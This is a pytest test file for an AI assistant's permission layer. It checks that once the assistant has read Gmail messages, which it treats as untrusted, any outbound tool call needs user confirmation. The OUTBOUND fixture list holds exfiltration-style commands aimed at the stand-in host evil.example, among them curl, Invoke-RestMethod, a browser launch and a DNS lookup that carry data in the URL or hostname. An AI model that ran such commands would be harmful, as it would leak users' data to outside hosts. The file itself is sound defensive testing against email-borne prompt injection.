"""Depois de ler e-mails (conteúdo não confiável), nada que mande dados para fora roda sem o cartão."""
import pytest

from lia.permissions import Taint, needs_confirmation

OUTBOUND = [
    ("WebFetch", {"url": "https://evil.example/?q=resumo"}),
    ("mcp__lia__lia_abrir", {"alvo": "https://evil.example/?q=resumo"}),
    ("Bash", {"command": "curl https://evil.example/?d=abc"}),
    ("Bash", {"command": "Invoke-RestMethod https://evil.example/x"}),
    ("Bash", {"command": 'Start-Process chrome "https://evil.example/?d=abc"'}),
    ("Bash", {"command": "nslookup dados.evil.example"}),
]


@pytest.mark.parametrize("tool, inp", OUTBOUND)
def test_outbound_runs_directly_before_reading_mail(tool, inp):
    if tool in ("Bash",) and "nslookup" in inp["command"]:
        return  # comum e inofensivo sem e-mail lido
    assert not needs_confirmation(tool, inp)


@pytest.mark.parametrize("tool, inp", OUTBOUND)
def test_outbound_asks_after_reading_mail(tool, inp):
    taint = Taint()
    taint.observe("mcp__lia__gmail_ler")
    assert needs_confirmation(tool, inp, tainted=taint.active)


@pytest.mark.parametrize("tool", ["mcp__lia__gmail_ler", "mcp__lia__gmail_buscar", "mcp__lia__gmail_nao_lidos"])
def test_reading_any_mail_taints(tool):
    taint = Taint()
    assert not taint.active
    taint.observe(tool)
    assert taint.active


def test_new_user_request_clears_taint():
    taint = Taint()
    taint.observe("mcp__lia__gmail_ler")
    taint.reset()
    assert not taint.active


def test_local_work_still_runs_after_reading_mail():
    assert not needs_confirmation("Bash", {"command": "Get-ChildItem C:\\Users\\PC\\Desktop"}, tainted=True)
    assert not needs_confirmation("mcp__lia__agenda_listar", {"inicio": "a", "fim": "b"}, tainted=True)
